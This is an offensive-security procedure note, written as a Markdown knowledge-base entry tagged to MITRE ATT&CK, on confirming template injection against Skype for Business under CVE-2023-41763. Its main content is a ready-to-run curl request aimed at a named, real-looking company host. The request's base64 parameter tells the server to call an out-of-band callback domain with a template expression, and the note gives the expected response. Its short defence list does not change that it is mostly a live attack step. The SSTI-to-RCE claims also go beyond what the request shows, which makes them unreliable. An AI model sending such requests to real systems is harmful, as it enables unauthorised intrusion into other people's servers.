---
tags:
  - exploitation
  - rce
  - confirmation
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/send-ssti-exploit-request]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:30:07.374Z'
sub_techniques: []
id: c4c9a5bc-1f1d-43e9-8795-2279fb82f338
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Privilege Escalation]]'
---
# Send-Modified-Request-and-Observe-Response

## Summary

This procedure sends the payload-injected request and analyzes the response to confirm SSTI exploitation, RCE, and EoP in Skype for Business.

## Description

Final exploitation step targeting CVE-2023-41763 et al., where response indicates successful template evaluation. Requires Burp or curl equivalent. Outcomes: 200 OK with payload processing, potential internal access.

## Requirements

1. Fully modified request in Burp Repeater
2. OAST service for callback monitoring
3. Access to send HTTP GET

## Defense

Defensive measures and detection strategies:

- Patch Skype for Business immediately (KB5032429)
- Implement response monitoring for SSTI indicators (e.g., math results in callbacks)
- Use IDS to flag 200 responses to suspicious parameters

## Objectives

1. Execute the SSTI payload on the server
2. Confirm vulnerability via response and callback
3. Escalate to full RCE/EoP

## Instructions

### Step 1: Transmit Request

**Context**: Send from Burp and monitor.

**Command** ([[commands/send-ssti-exploit-request]]):
```bash
curl -X GET "https://fec-feweb-ext.mtn.com/lwa/Webpages/LwaClient.aspx?meeturl=aHR0cDovL2NtZDRjdm5laTU2Z3U5ZXRnMjIwb3AxaGI3ZWV3eDZjdS5vYXN0LmZ1bi8/aWQ9TE1OJTI1ezEzMzcqMTMzN30jLnh4Ly8=" -H "Host: fec-feweb-ext.mtn.com" -H "Connection: close" -H "Accept-Encoding: gzip, deflate" -H "User-Agent: Mozilla/5.0"
```

> Expected output: HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8. Check OAST for id=LMN%{1780449}# confirming evaluation.

### Step 2: Analyze Callback

**Context**: Verify SSTI success.

Monitor OAST dashboard for interaction.

> Success if callback shows computed 1337*1337=1780449, indicating template injection and path to RCE.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Privilege Escalation]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used

- [[commands/send-ssti-exploit-request]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[exploitation]]
- [[rce]]
- [[confirmation]]
